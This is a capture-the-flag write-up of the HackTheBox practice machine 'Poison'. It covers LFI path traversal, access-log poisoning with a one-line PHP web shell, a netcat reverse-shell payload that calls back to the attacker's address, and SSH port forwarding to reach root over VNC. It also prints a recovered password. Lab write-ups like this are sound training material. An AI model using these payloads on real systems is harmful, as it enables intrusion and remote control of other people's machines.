---
title: Poison Hackthebox Writeup
date: 2020-12-22 04:00:00 +0800
categories: [Hackthebox, Retired]
tags: [freebsd,vnc,log poisoning,php,reverse shell,lfi to rce]     # TAG names should always be lowercase
image: /assets/img/poison-hackthebox/poison-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@Poison:~$


Column | Details
------------ | -------------
Name | Poison
IP | 10.10.10.84
Points | 30
Os | FreeBSD
Difficult | Medium
Creator | [unknown]()
Out on | 2018

# Summary:~$

* Discovering the new host and scanning for open ports.
* LFI vulnerability in the search tab.
* Accessing `httpd-access.log` which further led to `log poisoning`.
* Getting `reverse shell` as *www*.
* Decoding a *base64* password to log into `SSH`.
* Exploiting `VNC` with a secret file to get Root.

# Starting:~$

## Nmap

Using `Nmap` to scan the host.

**Command**: *nmap -p- -sV -T4 10.10.10.84*

___
![](/assets/img/poison-hackthebox/nmap-scans.png)

Accessing `Port 80`, We got a search bar.

___
![](/assets/img/poison-hackthebox/port-80-2.png)

I search `info.php`, and checked the URL.

___
![](/assets/img/poison-hackthebox/info-php-3.png)

Let's try `LFI` i.e. *Local File Inclusion*.

**Command**: *http://10.10.10.84/browse.php?file=../../../../../../../../../../../../../../../etc/passwd*

Checking view-source page for better understanding.

___
![](/assets/img/poison-hackthebox/got-etc-passwd-4.png)

We got the `/etc/passwd` file. After that I googled *LFI to RCE php* and found this [blog](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/)

Accessing `/var/log/httpd-access.log`. We got this:

___
![](/assets/img/poison-hackthebox/httpd-access-logs-7.png)

I found another [blog](https://roguecod3r.wordpress.com/2014/03/17/lfi-to-shell-exploiting-apache-access-log/) on `LFI` to `RCE`.

Following the steps as mentioned in the blog, I injected a `single line php shell`.

**Command**: *GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1*

___
![](/assets/img/poison-hackthebox/running-terminal-bad-req-9.png)

Checking `id` command.

___
![](/assets/img/poison-hackthebox/got-command-execution-10.png)

Now let's get a [reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), using Burp.

**Payload**: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.X.X 1234 >/tmp/f

Sending the request by URL encoding (using `cntrl+u`).

___
![](/assets/img/poison-hackthebox/got-shell-13.png)

We got a shell as `www`.

Now we don't have permissions to read *user flag*, so I check each directory manually and found this : `/usr/local/www/apache24/data/pwdbackup.txt`

___
![](/assets/img/poison-hackthebox/got-pwdbackup-14.png)

Used an online tool to decode it with `base64`. Got password as `Charix!2#4%6&8(0`.

___
![](/assets/img/poison-hackthebox/got-password-for-charix-15.png)

Logging in as `charix` in SSH and got `user flag`.

___
![](/assets/img/poison-hackthebox/loggedin-as-ssh-charix-16.png)

For privilege escalation, I found a file named `secret.zip` which requires a passcode.

___
![](/assets/img/poison-hackthebox/secret-zip-17.png)

Let's download this file to our local machine using [scp](https://www.linuxtechi.com/scp-command-examples-in-linux/).

**Command on your local machine**: *scp charix@10.10.10.84:/home/charix/secret.zip /tmp*

I tried `zip2john` to crack the password but nothing worked, finally I tried charix's password i.e. *Charix!2#4%6&8(0* and it worked.

We got a file called `secret`.

___
![](/assets/img/poison-hackthebox/cracked-secret-zip-using-previous-password-19.png).

Now let's run [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)on victim machine using wget and hosting it on local system.

**Wget Command**: *wget http://10.10.X.X:8081/linpeas.sh*

**Hosting Command**: *python3 -m http.server 8081*

Running it by giving executable permissions: *chmod +x linpeas.sh*, I found something interesting:

___
![](/assets/img/poison-hackthebox/active-ports-in-linpeas-20.png)

`Port 5901 and 5801` are running locally, I googled about it and found those ports are for `VNC`: *Virtual Network Computing (VNC) is a graphical desktop-sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. It transmits the keyboard and mouse events from one computer to another, relaying the graphical-screen updates back in the other direction, over a network.*

I checked VNC using `ps aux` and found it running as root.

___
![](/assets/img/poison-hackthebox/vnc-running-as-root-21.png)

To run `vnc` we need port forwarding as it won't be able to run from the victim machine.

**Commands for SSH port forwarding**: *ssh -L 5000:127.0.0.1:5901 charix@10.10.10.84*   (on local machine)

Now `VNC` is running locally on port `5000` on our environment.

**Command**: *vncviewer -passwd secret 127.0.0.1:5000.* (download vncviewer using *sudo apt-get install vncviewer*).

Using `secret` file as the password to access *VNC*, We got Root.

___
![](/assets/img/poison-hackthebox/got-root-22.png)


